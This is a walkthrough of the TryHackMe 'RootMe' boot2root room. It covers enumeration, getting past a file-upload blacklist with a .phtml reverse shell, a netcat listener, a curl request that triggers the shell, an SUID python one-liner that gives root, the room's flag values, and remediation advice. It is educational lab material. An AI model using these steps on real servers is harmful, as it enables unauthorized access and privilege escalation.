# RootMe — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A professional penetration testing walkthrough for the **RootMe** room on TryHackMe.

---

## 📋 Executive Summary
RootMe is a classic introductory Linux boot2root machine. The objective is to identify hidden directories on an Apache web server, bypass an insecure file upload blacklist, execute a reverse webshell as `www-data`, and escalate privileges to `root` via an SUID-configured Python interpreter.

* **Target OS:** Linux (Ubuntu 18.04 LTS)
* **Initial Access:** Insecure File Upload Extension Blacklist Bypass (`.phtml`) on `/panel/`.
* **Privilege Escalation:** SUID `/usr/bin/python` binary abuse via GTFOBins.
* **Flags Recovered:**
  * `user.txt`: `THM{y0u_g0t_a_sh3ll}`
  * `root.txt`: `THM{pr1v1l3g3_3sc4l4t10n}`
* **Artifacts in Directory:**
  * `shell.phtml`: PHP reverse shell script configured for filter bypass

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```
* **Port 22/tcp:** OpenSSH 7.6p1 Ubuntu
* **Port 80/tcp:** Apache httpd 2.4.29 Ubuntu

### 1.2 Web Directory Enumeration (Gobuster)
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```
Discovered endpoints:
* `/panel/` (HTTP 200) — File upload interface
* `/uploads/` (HTTP 200) — Upload directory containing user submissions

---

## 💥 Stage 2: Initial Foothold (File Upload Bypass)

### 2.1 Extension Filter Bypass
Uploading standard `.php` files triggered an error:
> *"Échec de l'envoi de fichier! Non autorisée"*

The application blacklisted `.php`. We bypassed the blacklist using alternative PHP extensions:
* Tested: `.php3`, `.php4`, `.php5`, `.phtml`
* Successful: `.phtml`

### 2.2 Spawning Reverse Shell
1. Prepared `shell.phtml` containing the reverse shell payload targeting port `4444`.
2. Uploaded `shell.phtml` at `http://<TARGET_IP>/panel/`.
3. Started netcat listener:
   ```bash
   nc -lvnp 4444
   ```
4. Triggered execution:
   ```bash
   curl http://<TARGET_IP>/uploads/shell.phtml
   ```
5. Shell caught as `www-data`.
6. Retrieved user flag:
   ```bash
   find / -name user.txt 2>/dev/null
   cat /var/www/user.txt
   # THM{y0u_g0t_a_sh3ll}
   ```

---

## 📈 Stage 3: Privilege Escalation (SUID Python)

### 3.1 SUID Binary Enumeration
```bash
find / -perm -u=s -type f 2>/dev/null
```
Key finding:
```text
/usr/bin/python
```

### 3.2 SUID Shell Spawning
Using GTFOBins Python SUID payload:
```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Verification and root flag:
```bash
whoami
# root
cat /root/root.txt
# THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 🛡️ Remediation
1. **Strict File Upload Validation:** Enforce strict file extension whitelisting (e.g. `.jpg`, `.png`) and inspect MIME type / magic bytes.
2. **Prevent Execution in Upload Directories:** Configure web server to disallow script execution inside `/uploads/`.
3. **Audit SUID Permissions:** Remove SUID bit from scripting binaries (`chmod u-s /usr/bin/python`).
